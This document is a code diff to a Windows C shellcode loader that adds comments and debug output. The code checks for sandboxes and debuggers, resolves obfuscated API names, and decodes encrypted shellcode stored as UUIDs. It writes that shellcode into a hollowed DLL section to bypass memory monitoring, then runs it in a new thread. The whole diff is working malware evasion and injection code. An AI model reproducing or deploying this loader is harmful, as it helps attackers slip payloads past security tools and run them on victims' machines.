@@ -1,6 +1,11 @@
 
 #include <Windows.h>
 #include <TlHelp32.h>
+#include <Rpc.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <tchar.h>
 
 #pragma comment (lib, "Rpcrt4.lib")
 
@@ -63,7 +68,7 @@ void decShell()
 
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+int _tmain(int argc, TCHAR **argv)
 {  
     DWORD_PTR pFuncAddr, pShellReader;
     DWORD dwOldProtect = 0;
@@ -73,13 +78,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     char *pMem;
     int nMemAlloc, nCtr = 0;
 
+
+    /* Check for a non-exist file, if found it we're inside sandbox */
     if (CreateFileA(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
     {
         return EXIT_FAILURE;
     }
 
+    puts("Deobfuscate all (APIs, Libraries, Decryption key)");
     deObfuscateAll();
 
+    /* Load needed libs */
     if (!(
         (hModule = LoadLibraryA((LPCSTR)cLib1Name)) &&
         (hModule2 = LoadLibraryA((LPCSTR)cLib2Name))
@@ -87,6 +96,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return EXIT_FAILURE;
     }
 
+    /* Get the Addresses of the APIs */
     if (!(
         (pVirtualProtectFunc = (VirtualProtectFunc) GetProcAddress(hModule, cVirtualProtect)) &&
         (pCreateThreadFunc = (CreateThreadFunc) GetProcAddress(hModule, cCreateThread)) &&
@@ -96,36 +106,70 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return EXIT_FAILURE;
     }
     
+    /* Check if the process under debugger */
     if (!pCheckRemoteDebuggerPresentFunc(GetCurrentProcess(), &bTrap) || bTrap)
     {
+        puts("The current process running under debugger");
         return EXIT_FAILURE;
     }
 
+    /* 
+        Move key bits to left, let's say the key is 0xfa,
+        Will represented as following in memory :
+            -> 00000000 00000000 00000000 11111010
+
+        After moving will be :
+            -> 00001111 10100000 00000000 00000000
+
+        That's a very large number.
+    */
     nMemAlloc = KEY << 20;
 
+    /* Ask os for very large memory, if fail maybe we're inside sandbox */
     if (!(pMem = (char *) malloc(nMemAlloc)))
     {
         return EXIT_FAILURE;
     }
 
+    /* Make large iterations */
     for (int idx = 0; idx < nMemAlloc; idx++)
     {
+        /* Count every iteration one by one */
         pMem[nCtr++] = 0x00;
     }
     
+    /* If number of iterations and the counter isn't same, we're inside sandbox */
     if (nMemAlloc != nCtr)
     {
         return EXIT_FAILURE;
     }
 
+    /* Deallocate memory */
+    free(pMem);
+
+    /* 
+        DLL hollowing to bypass memory monitoring.
+        Useful resource --> https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
+        DLL Base Addr + 0x1000 = RWX section.
+        We can parse it and obtain the same result.
+    */
     pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;
+
+    /* Shell will point to the hollowed address */
     pShell = (unsigned char *) pFuncAddr;
+
+    /* This will read shellcode from UUIDs, and reflect it in the hollowed DLL directly */
     pShellReader = (DWORD_PTR) pShell;
 
+    printf("Shellcode will be written at %p\n", pShell);
+
+    /* Change permission of the section, to overwrite it */
     if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
     {
         return EXIT_FAILURE;
     }
+
+    puts("Deobfuscate UUIDs, and obtain encrypted shellcode from it");
 
     for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
     {
@@ -134,18 +178,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             return EXIT_FAILURE;
         }
         
+        /* We have read 16 byte (The size of each UUID), let's move to the next memory space */
         pShellReader += 0x10;
     }
 
-    free(pMem);
+    puts("Decrypt shellcode");
     decShell();
     
-
+    /* Back the old permission */
     if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
     {
         return EXIT_FAILURE;
     }
 
+    /* Create a new thread */
     if ((hThread = pCreateThreadFunc(0, 0, (LPTHREAD_START_ROUTINE)pFuncAddr, 0, 0, 0)) == NULL)
     {
         return EXIT_FAILURE;
